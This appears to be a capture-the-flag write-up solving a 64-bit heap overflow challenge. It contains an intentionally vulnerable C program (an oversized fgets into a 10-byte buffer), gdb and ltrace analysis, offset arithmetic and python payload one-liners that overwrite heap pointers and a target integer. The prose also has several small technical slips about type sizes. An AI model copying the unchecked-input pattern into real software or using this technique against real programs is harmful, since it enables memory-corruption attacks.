Let's take a look at the source code...

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

struct vaccum  
{
   char* quasar;
   int asteroid; 
};

int main(int argc, char **argv)
{
   struct vaccum *blue, *red, *yellow;

   blue = malloc(sizeof(struct vaccum));
   blue->quasar = malloc(10);
   blue->asteroid = 15;

   
   red = malloc(sizeof(struct vaccum));
   red->quasar = malloc(10);
   red->asteroid = 43;
   
   yellow = malloc(sizeof(struct vaccum));
   yellow->quasar = malloc(10);
   yellow->asteroid = 10;  

   strcpy(red->quasar, "4.367");
   strcpy(yellow->quasar, "far far away");
   fgets(blue->quasar, 100, stdin);
   
   printf("Alpha Centari is %s light years away.\n", red->quasar);
   printf("The center of the milky way galaxy is %s.\n", yellow->quasar);
   printf("The asteroid is %d parsecs away.\n", yellow->asteroid);

   if (yellow->asteroid == 0xdeadbeef)
   {
      printf("It's funny how much a researcher can tell from light. Level Cleared!\n");
   }

   printf("Imagine how long it will be, untill a researcher that is working hard is living on Mars. You wouldn't know since your not researching.\n");
}
```

So right off the batm we can see the vulnerabillity. There is a fgets call which will allow 100 characters in, for a 10 character space. That is what we will use to overflow the heap. Looking on later in the program, we see that we will need to set the int yellow->asteroid equal to the hex string 0xdeadbeef. We can accomplish this using the heap overflow exploit we saw earlier with the fgets call. However there are a couple of curve ballls here. We see that along our way of overflowing it, we will overflow other pointers which are called via printf functions right before the if then statement. If we oveflow these with an address that is not legitamite, the programm will try to access memory that does not belong to the program and as a result have a semgentation fault and close. Let's take a look at the heap space using ltrace to get a better picture (all ltrace does is it traces library calls).

```
guyinatuxedo@tux:/Hackery/escape/heap_exp/h2_64$ ltrace ./h2_64 
__libc_start_main(0x400636, 1, 0x7fffffffdf78, 0x400790 <unfinished ...>
malloc(16)                                       = 0x602010
malloc(10)                                       = 0x602030
malloc(16)                                       = 0x602050
malloc(10)                                       = 0x602070
malloc(16)                                       = 0x602090
malloc(10)                                       = 0x6020b0
fgets(deadbeef
"deadbeef\n", 100, 0x7ffff7dd18e0)         = 0x602030
printf("Alpha Centari is %s light years "..., "4.367"Alpha Centari is 4.367 light years away.
) = 41
printf("The center of the milky way gala"..., "far far away"The center of the milky way galaxy is far far away.
) = 52
printf("The asteroid is %d parsecs away."..., 10The asteroid is 10 parsecs away.
) = 33
puts("Imagine how long it will be, unt"...Imagine how long it will be, untill a researcher that is working hard is living on Mars. You wouldn't know since your not researching.
)      = 135
+++ exited (status 0) +++
```

So from that output, we can see our space allocated in the heap via calls to malloc.

```
malloc(16)                                       = 0x602010
malloc(10)                                       = 0x602030
malloc(16)                                       = 0x602050
malloc(10)                                       = 0x602070
malloc(16)                                       = 0x602090
malloc(10)                                       = 0x6020b0
```

First off we see that the mallocs used to initialize the structures blue, red, and yellow are 16 bytes unlike the previous challenge. This is because the structs are now also storing an int alongside a pointer, which is 8 bytes long each for 64 bit systems. So the eight bytes from the int and the eight bytes from the pointer come together to make 8 bytes. Since the sequence the spaces are allocated in depends on the sequence that the malloc calls are made, we can assume that our input starts at 0x602030. From this, we can also tell that the target we need to overwrite is the int located at 0x602090, which will be in the 8 bytes after the first 8 bytes (since that is occupied by the pointer). Based upon our previous assumptions pointers that reside in the first 8 bytes (because when the struct was declared the pointer was before the int) of0x602050, and 0x602090 will be called in two seperate printf statments after our overflow so we need to make sure those address point to a valid memory addres (i'm just going to rewrite it to be the same) otherwise the program will crash. Now we've made a lot of assumptions, let's prove themm by analyzing the data in gdb then map out exactly what heap locations contain what.

```
gdb-peda$ disas main
Dump of assembler code for function main:
   0x0000000000400636 <+0>:   push   rbp
   0x0000000000400637 <+1>:   mov    rbp,rsp
   0x000000000040063a <+4>:   sub    rsp,0x30
   0x000000000040063e <+8>:   mov    DWORD PTR [rbp-0x24],edi
   0x0000000000400641 <+11>:  mov    QWORD PTR [rbp-0x30],rsi
   0x0000000000400645 <+15>:  mov    edi,0x10
   0x000000000040064a <+20>:  call   0x400520 <malloc@plt>
   0x000000000040064f <+25>:  mov    QWORD PTR [rbp-0x8],rax
   0x0000000000400653 <+29>:  mov    edi,0xa
   0x0000000000400658 <+34>:  call   0x400520 <malloc@plt>
   0x000000000040065d <+39>:  mov    rdx,rax
   0x0000000000400660 <+42>:  mov    rax,QWORD PTR [rbp-0x8]
   0x0000000000400664 <+46>:  mov    QWORD PTR [rax],rdx
   0x0000000000400667 <+49>:  mov    rax,QWORD PTR [rbp-0x8]
   0x000000000040066b <+53>:  mov    DWORD PTR [rax+0x8],0xf
   0x0000000000400672 <+60>:  mov    edi,0x10
   0x0000000000400677 <+65>:  call   0x400520 <malloc@plt>
   0x000000000040067c <+70>:  mov    QWORD PTR [rbp-0x10],rax
   0x0000000000400680 <+74>:  mov    edi,0xa
   0x0000000000400685 <+79>:  call   0x400520 <malloc@plt>
   0x000000000040068a <+84>:  mov    rdx,rax
   0x000000000040068d <+87>:  mov    rax,QWORD PTR [rbp-0x10]
   0x0000000000400691 <+91>:  mov    QWORD PTR [rax],rdx
   0x0000000000400694 <+94>:  mov    rax,QWORD PTR [rbp-0x10]
   0x0000000000400698 <+98>:  mov    DWORD PTR [rax+0x8],0x2b
   0x000000000040069f <+105>: mov    edi,0x10
   0x00000000004006a4 <+110>: call   0x400520 <malloc@plt>
   0x00000000004006a9 <+115>: mov    QWORD PTR [rbp-0x18],rax
   0x00000000004006ad <+119>: mov    edi,0xa
   0x00000000004006b2 <+124>: call   0x400520 <malloc@plt>
   0x00000000004006b7 <+129>: mov    rdx,rax
   0x00000000004006ba <+132>: mov    rax,QWORD PTR [rbp-0x18]
   0x00000000004006be <+136>: mov    QWORD PTR [rax],rdx
   0x00000000004006c1 <+139>: mov    rax,QWORD PTR [rbp-0x18]
   0x00000000004006c5 <+143>: mov    DWORD PTR [rax+0x8],0xa
   0x00000000004006cc <+150>: mov    rax,QWORD PTR [rbp-0x10]
   0x00000000004006d0 <+154>: mov    rax,QWORD PTR [rax]
   0x00000000004006d3 <+157>: mov    DWORD PTR [rax],0x36332e34
   0x00000000004006d9 <+163>: mov    WORD PTR [rax+0x4],0x37
   0x00000000004006df <+169>: mov    rax,QWORD PTR [rbp-0x18]
   0x00000000004006e3 <+173>: mov    rax,QWORD PTR [rax]
   0x00000000004006e6 <+176>: movabs rcx,0x2072616620726166
   0x00000000004006f0 <+186>: mov    QWORD PTR [rax],rcx
   0x00000000004006f3 <+189>: mov    DWORD PTR [rax+0x8],0x79617761
   0x00000000004006fa <+196>: mov    BYTE PTR [rax+0xc],0x0
   0x00000000004006fe <+200>: mov    rdx,QWORD PTR [rip+0x20094b]        # 0x601050 <stdin@@GLIBC_2.2.5>
   0x0000000000400705 <+207>: mov    rax,QWORD PTR [rbp-0x8]
   0x0000000000400709 <+211>: mov    rax,QWORD PTR [rax]
   0x000000000040070c <+214>: mov    esi,0x64
   0x0000000000400711 <+219>: mov    rdi,rax
   0x0000000000400714 <+222>: call   0x400510 <fgets@plt>
   0x0000000000400719 <+227>: mov    rax,QWORD PTR [rbp-0x10]
   0x000000000040071d <+231>: mov    rax,QWORD PTR [rax]
   0x0000000000400720 <+234>: mov    rsi,rax
   0x0000000000400723 <+237>: mov    edi,0x400818
   0x0000000000400728 <+242>: mov    eax,0x0
   0x000000000040072d <+247>: call   0x4004f0 <printf@plt>
   0x0000000000400732 <+252>: mov    rax,QWORD PTR [rbp-0x18]
   0x0000000000400736 <+256>: mov    rax,QWORD PTR [rax]
   0x0000000000400739 <+259>: mov    rsi,rax
   0x000000000040073c <+262>: mov    edi,0x400840
   0x0000000000400741 <+267>: mov    eax,0x0
   0x0000000000400746 <+272>: call   0x4004f0 <printf@plt>
   0x000000000040074b <+277>: mov    rax,QWORD PTR [rbp-0x18]
   0x000000000040074f <+281>: mov    eax,DWORD PTR [rax+0x8]
   0x0000000000400752 <+284>: mov    esi,eax
   0x0000000000400754 <+286>: mov    edi,0x400870
   0x0000000000400759 <+291>: mov    eax,0x0
   0x000000000040075e <+296>: call   0x4004f0 <printf@plt>
   0x0000000000400763 <+301>: mov    rax,QWORD PTR [rbp-0x18]
   0x0000000000400767 <+305>: mov    eax,DWORD PTR [rax+0x8]
   0x000000000040076a <+308>: cmp    eax,0xdeadbeef
   0x000000000040076f <+313>: jne    0x40077b <main+325>
   0x0000000000400771 <+315>: mov    edi,0x400898
   0x0000000000400776 <+320>: call   0x4004e0 <puts@plt>
   0x000000000040077b <+325>: mov    edi,0x4008e0
   0x0000000000400780 <+330>: call   0x4004e0 <puts@plt>
   0x0000000000400785 <+335>: mov    eax,0x0
   0x000000000040078a <+340>: leave  
   0x000000000040078b <+341>: ret    
End of assembler dump.
gdb-peda$ b *main+222
Breakpoint 1 at 0x400714
gdb-peda$ r
```

One wall of text later...

```
Breakpoint 1, 0x0000000000400714 in main ()
gdb-peda$ x/4w 0x602050
0x602050:   0x00602070  0x00000000  0x0000002b  0x00000000
gdb-peda$ x/4w 0x602090
0x602090:   0x006020b0  0x00000000  0x0000000a  0x00000000
gdb-peda$ x/s 0x00602070
0x602070:   "4.367"
gdb-peda$ x/s 0x006020b0
0x6020b0:   "far far away"
gdb-peda$ b *main+227
Breakpoint 2 at 0x400719
gdb-peda$ c
Continuing.
75395128
```

Keep in mind that 0xa is hex for 10, and 0x2b is hex for 43. Also due to the fact that pointers are 8 bytes instead of 4, we should expect the extra space. Same thing goes with the ints.

```
Breakpoint 2, 0x0000000000400719 in main ()
gdb-peda$ x/4w 0x602010
0x602010:   0x00602030  0x00000000  0x0000000f  0x00000000
gdb-peda$ x/s 0x602030
0x602030:   "75395128\n"
gdb-peda$ c
```

So our predictions held true (keep in mind that 0xf is hex for the decimal 15). So using our previous claims, our knowledge of how the heap works (see previous challenge for more detail), and analyzing the actual code itself and comparing the positions of the malloc calls to that of the alloated heap spaces (since they are both in the same order) we can have the following heap mapping.

```
0x602010:  stores a pointer to 0x602030 in first 8 bytes, and the int 15 in the second eight bytes
0x602030:  stores the address to space which stores our input, only 10 bytes long
0x602050:  stores a pointer to 0x602070 in first 8 bytes, and the int 43 in the second eight bytes
0x602070:  stores the address to space that is 10 bytes long that holds the string "4.367" after the first strcpy function writes to it
0x602090:  stores a pointer to 0x6020b0 in first four bytes and the int 10 in the second eight bytes
0x6020b0:  stores the address to space 10 bytes long, after second strcpy function writes to it it has the value "far far away"
```

So now that we have the mapping, it makes pur job so much easier. Now to construct the payload, however we will do it in parts. the first part involves overflowing the pointer stored at 0x602050. Let's figure out the offset.

```
>>> 0x602050 - 0x602030
32
```

So the first 8 characters we write after the first 32 characters, will be interpreted as the pointer. Let's try to input 33 characters just to see if that holds true (it just break). 

```
guyinatuxedo@tux:/Hackery/escape/heap_exp/h2_64$ python -c 'print "0"*33' | ./h2_64 
Segmentation fault (core dumped)
```

Just as expected. Now let's right 32 characters, followed by the address that is supposed to be there, 0x602070. This way it shouldn't break. In order for the fromatting to properley happen, we will need to add the zeroes that 64 bit addresses have to fill up the space.

```
guyinatuxedo@tux:/Hackery/escape/heap_exp/h2_64$ python -c 'print "0"*32 + "\x70\x20\x60\x00\x00\x00\x00\x00"' | ./h2_64 
Alpha Centari is 4.367 light years away.
The center of the milky way galaxy is far far away.
The asteroid is 10 parsecs away.
Imagine how long it will be, untill a researcher that is working hard is living on Mars. You wouldn't know since your not researching.
```

So that is the first pointer we have to worry about. The second is in the first eight bytes of 0x602090. Since we are eight bytes past 0x602050 already, let's figure out the offset.

```
>>> 0x602090 - 0x602050
64
>>> 64 - 8
56
```

So 56 characters past our current location, we should need to write the address 0x00000000006020b0 (or another functioning address) in order for the program to properly function. Let's try it.

```
guyinatuxedo@tux:/Hackery/escape/heap_exp/h2_64$ python -c 'print "0"*32 + "\x70\x20\x60\x00\x00\x00\x00\x00" + "0"*56 + "\xb0\x20\x60\x00\x00\x00\x00\x00"' | ./h2_64 
Alpha Centari is 00000000000000000000000000000000� ` light years away.
The center of the milky way galaxy is far far away.
The asteroid is 10 parsecs away.
Imagine how long it will be, untill a researcher that is working hard is living on Mars. You wouldn't know since your not researching.
```

It worked, we managed to not disturb the pointers with our oveflow. Now with our exploit, we are right where the value that is being evaluated yellow->asteroid is being stored. So we should just be able to overwrite it with the hex string 0xdeadbeef. We don't need to add the extra zeroes, because we alread saw earlier that the values they are zero (rememebr this program uses little endian). And unlike the other two pointers were dealing with, here we can just write over the last 4 bytes of the int, intsead of having to rewrite the whole pointer. And then we should pwn the challenge.

```
guyinatuxedo@tux:/Hackery/escape/heap_exp/h2_64$ python -c 'print "0"*32 + "\x70\x20\x60\x00\x00\x00\x00\x00" + "0"*56 + "\xb0\x20\x60\x00\x00\x00\x00\x00" + "\xef\xbe\xad\xde"' | ./h2_64 
Alpha Centari is 00000000000000000000000000000000� ` light years away.
The center of the milky way galaxy is far far away.
The asteroid is -559038737 parsecs away.
It's funny how much a researcher can tell from light. Level Cleared!
Imagine how long it will be, untill a researcher that is working hard is living on Mars. You wouldn't know since your not researching.
```

Just like that we pwned the binary. 
